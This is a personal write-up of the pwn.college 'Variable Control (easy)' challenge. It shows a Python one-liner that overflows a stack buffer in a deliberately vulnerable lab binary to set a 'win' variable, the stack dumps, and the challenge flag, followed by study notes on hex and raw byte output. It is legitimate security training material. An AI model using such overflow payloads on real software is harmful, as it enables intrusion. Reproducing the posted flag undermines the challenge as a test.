# Binary Exploitation 

## Challenge: Variable Control (easy)
### Solve 
In this challenge, you must overflow the buffer precisely to set a win condition variable to a specific value.  

**Flag:** `pwn.college{Y2PlDYPuf2N3Bi3nQgFIN-voDpX.QX3UzMzwyMwAzNzEzW}`

METHOD:  
1. find file name in ls /challenge
2. execute the executable file /challenge/filename
3. It says:
   In this level, there is a "win" variable.  
By default, the value of this variable is zero.  
However, if you can set variable to 0x679b4be5, the flag will be printed.  
You can change this variable by overflowing the input buffer, but keep endianness in mind!  
The "win" variable is stored at 0x7fff8445559c, 28 bytes after the start of your input buffer.
4. So, buffer till 28 bytes then overwrite the win variable to that to get the flag
5. write a python code feeding the bytes and then pipe it's output to stdin of teh .c file
6. python3 - <<'PY' | /challenge/binary-exploitation-var-control-w   
import sys  
sys.stdout.buffer.write(b"A"*28 + b"\xe5\x4b\x9b\x67")  
PY  


```bash
hacker@binary-exploitation~variable-control-easy:~$ python3 - <<'PY' | /challenge/binary-exploitation-var-control-w
import sys
sys.stdout.buffer.write(b"A"*28 + b"\xe5\x4b\x9b\x67")
PY
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fffa9bea410 (rsp+0x0000) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007fffa9bea418 (rsp+0x0008) | b8 b5 be a9 ff 7f 00 00 | 0x00007fffa9beb5b8 |
| 0x00007fffa9bea420 (rsp+0x0010) | a8 b5 be a9 ff 7f 00 00 | 0x00007fffa9beb5a8 |
| 0x00007fffa9bea428 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007fffa9bea430 (rsp+0x0020) | a0 64 3e c5 dc 71 00 00 | 0x000071dcc53e64a0 |
| 0x00007fffa9bea438 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffa9bea440 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffa9bea448 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffa9bea450 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffa9bea458 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffa9bea460 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffa9bea468 (rsp+0x0058) | 00 03 9a b5 8c 32 b1 9a | 0x9ab1328cb59a0300 |
| 0x00007fffa9bea470 (rsp+0x0060) | b0 b4 be a9 ff 7f 00 00 | 0x00007fffa9beb4b0 |
| 0x00007fffa9bea478 (rsp+0x0068) | 1a 1e 40 00 00 00 00 00 | 0x0000000000401e1a |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7fffa9bea410, and our base pointer points to 0x7fffa9bea470.
This means that we have (decimal) 14 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 112 bytes.
The input buffer begins at 0x7fffa9bea440, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 27 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, if you can set variable to 0x679b4be5, the flag will be printed.
You can change this variable by overflowing the input buffer, but keep endianness in mind!
The "win" variable is stored at 0x7fffa9bea45c, 28 bytes after the start of your input buffer.

 But be careful! There is also a LOSE variable. If this variable ends up non-zero, the program will terminate and you
will not get the flag. Be careful not to overwrite this variable.

The "lose" variable is stored at 0x7fffa9bea460, 32 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7fffa9bea440 (the start of the input buffer)
right up to (but not including) 0x7fffa9beb440 (which is 4069 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!
You sent 32 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fffa9bea410 (rsp+0x0000) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007fffa9bea418 (rsp+0x0008) | b8 b5 be a9 ff 7f 00 00 | 0x00007fffa9beb5b8 |
| 0x00007fffa9bea420 (rsp+0x0010) | a8 b5 be a9 ff 7f 00 00 | 0x00007fffa9beb5a8 |
| 0x00007fffa9bea428 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007fffa9bea430 (rsp+0x0020) | a0 64 3e c5 20 00 00 00 | 0x00000020c53e64a0 |
| 0x00007fffa9bea438 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007fffa9bea440 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fffa9bea448 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fffa9bea450 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fffa9bea458 (rsp+0x0048) | 41 41 41 41 e5 4b 9b 67 | 0x679b4be541414141 |
| 0x00007fffa9bea460 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffa9bea468 (rsp+0x0058) | 00 03 9a b5 8c 32 b1 9a | 0x9ab1328cb59a0300 |
| 0x00007fffa9bea470 (rsp+0x0060) | b0 b4 be a9 ff 7f 00 00 | 0x00007fffa9beb4b0 |
| 0x00007fffa9bea478 (rsp+0x0068) | 1a 1e 40 00 00 00 00 00 | 0x0000000000401e1a |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fffa9bea440
- the saved frame pointer (of main) is at 0x7fffa9bea470
- the saved return address (previously to main) is at 0x7fffa9bea478
- the saved return address is now pointing to 0x401e1a.
- the canary is stored at 0x7fffa9bea468.
- the canary value is now 0x9ab1328cb59a0300.
- the address of the win variable is 0x7fffa9bea45c.
- the value of the win variable is 0x679b4be5.
- the address of the lose variable is 0x7fffa9bea460.
- the value of the lose variable is 0x0.

You win! Here is your flag:
pwn.college{Y2PlDYPuf2N3Bi3nQgFIN-voDpX.QX3UzMzwyMwAzNzEzW}


Goodbye!
```


### New Learnings
1. 0x = this number is in hexadecimal (base 16)  
ex: ff in hex = 15*16 + 15 = 255 in decimal.  
In binary 0xff = 11111111
2. Why hex is useful: one hex digit represents 4 bits. Two hex digits (00â€“ff) represent exactly one byte (8 bits).
3. Common building blocks:-  
a) repeat a byte N times: b"A"*96 (# 96 ASCII 'A' bytes (0x41))
b) literal hex bytes: b"\x01\x02\xff"      # three bytes: 0x01 0x02 0xff
4. sys.stdout.buffer  
Accesses the raw binary interface of stdout.  
Lets you write bytes instead of text strings.
5. sys.stdout.buffer.write(data)  
Writes binary data (data must be of type bytes) directly to stdout.  
   



### References
Chatgpt for help with python part.  
